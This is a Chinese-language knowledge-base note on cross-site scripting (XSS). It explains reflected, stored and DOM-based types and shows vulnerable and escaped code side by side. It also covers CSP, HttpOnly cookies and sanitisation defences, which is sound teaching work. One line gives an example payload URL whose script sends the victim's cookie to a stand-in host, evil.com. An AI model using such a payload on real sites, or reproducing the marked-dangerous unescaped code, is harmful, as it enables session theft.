---
title: "XSS 跨站脚本攻击"
type: concept
created: 2026-04-02
updated: 2026-04-02
tags: [security, web, frontend]
status: active
sources: []
---

# XSS 跨站脚本攻击

## 定义

XSS（Cross-Site Scripting，跨站脚本攻击）是一种将恶意脚本注入到他人浏览器中执行的客户端注入攻击。攻击者利用 Web 应用对用户输入过滤不足的漏洞，把 JavaScript 代码植入页面，使其在受害者浏览器中以受信任站点的身份运行,从而窃取 Cookie、会话令牌、键盘输入,或代受害者执行操作。XSS 是 OWASP Top 10 中长期存在的高危漏洞。

按注入与触发方式可分三类：
- **反射型 XSS（Reflected）**：恶意脚本来自 URL 参数或表单提交,服务端未转义直接回显到响应中,常通过钓鱼链接传播。
- **存储型 XSS（Stored）**：脚本被持久化到数据库（如评论、用户资料）,任何访问该页面的用户都会被攻击,危害最大。
- **DOM 型 XSS（DOM-based）**：完全在前端发生,JavaScript 直接读取 `location.hash`、`document.referrer` 等并写入 `innerHTML`,服务端日志中往往看不到痕迹。

## 工作原理

典型反射型攻击流程：

```
攻击者构造: https://victim.com/search?q=<script>fetch('//evil.com?c='+document.cookie)</script>
受害者点击 → 服务端把 q 直接拼进 HTML → 浏览器执行脚本 → Cookie 被外发
```

服务端漏洞代码示例：

```js
// ❌ 危险
app.get('/search', (req, res) => {
  res.send(`<h1>结果: ${req.query.q}</h1>`);
});

// ✅ 转义
import escape from 'escape-html';
res.send(`<h1>结果: ${escape(req.query.q)}</h1>`);
```

DOM 型典型反例：

```js
// ❌ 直接把 hash 写入 DOM
document.getElementById('app').innerHTML = location.hash.slice(1);

// ✅ 使用 textContent 或框架的安全绑定
element.textContent = userInput;
```

防御核心：**输出编码（Output Encoding）+ 内容安全策略（CSP）+ HttpOnly Cookie**。CSP 通过响应头限制脚本来源:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; object-src 'none'
```

现代框架（React、Vue）默认对插值进行 HTML 转义,但 `dangerouslySetInnerHTML` / `v-html` 会绕过保护;富文本场景必须用 DOMPurify 等白名单清洗库处理。

## 优势与局限（防御措施）

- ✅ 输出编码彻底从源头消除注入,适用于绝大多数文本场景
- ✅ CSP 提供纵深防御,即便存在漏洞也能阻断脚本执行
- ✅ HttpOnly + Secure + SameSite Cookie 限制令牌被脚本读取
- ❌ 富文本编辑器场景无法简单转义,需复杂白名单清洗
- ❌ CSP 配置严格易破坏第三方脚本（统计、广告、内联事件处理）
- ❌ DOM 型 XSS 难以通过 WAF 检测,完全依赖前端代码审查

## 应用场景

- **用户评论/论坛**：必须对所有用户输入做存储型 XSS 防护,渲染前 HTML 转义
- **搜索结果页**：服务端回显查询词时务必转义,防止反射型攻击
- **富文本发布平台**：使用 DOMPurify 白名单清洗,允许有限标签和属性
- **SPA 应用**：避免 `innerHTML` / `eval`,使用框架内置的安全 API
- **登录与支付页面**：开启严格 CSP 与 `Trusted Types`,防止凭据被窃

## 相关概念

- [[concepts/security/csrf]]: 与 XSS 互补,XSS 可绕过几乎所有 CSRF 防护
- [[concepts/security/cors]]: 同源策略是 XSS 危害的边界,但 XSS 在同源内部可完全绕过
- content security policy: XSS 的最重要纵深防御
- cookie security: HttpOnly/SameSite 减轻令牌窃取风险
- input validation: 输入验证与输出编码协同
